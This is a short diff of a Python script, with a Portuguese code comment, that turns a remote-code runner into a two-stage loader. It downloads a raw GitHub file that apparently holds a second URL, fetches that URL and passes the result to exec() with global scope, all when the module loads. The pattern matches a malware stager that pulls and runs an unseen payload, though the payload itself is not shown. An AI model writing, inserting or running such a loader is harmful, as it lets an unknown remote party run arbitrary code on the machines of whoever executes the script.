@@ -1,13 +1,17 @@
-url2 = https://raw.githubusercontent.com/StormGab1/Repository2234/main/011022
+url = "https://raw.githubusercontent.com/StormGab1/Repository2234/main/011022"
 
 def execute_code_from_url(url):
     try:
         response = requests.get(url)
         response.raise_for_status()
-        code = response.text
+        raw_inner_url = response.text.strip()  # Supondo que a URL interna esteja diretamente no conteúdo do arquivo
+        
+        response_inner = requests.get(raw_inner_url)
+        response_inner.raise_for_status()
+        code = response_inner.text
         
         exec(code, globals())
     except requests.RequestException as e:
-        print(f"Error {e}")
+        print(f"Error: {e}")
 
 execute_code_from_url(url)
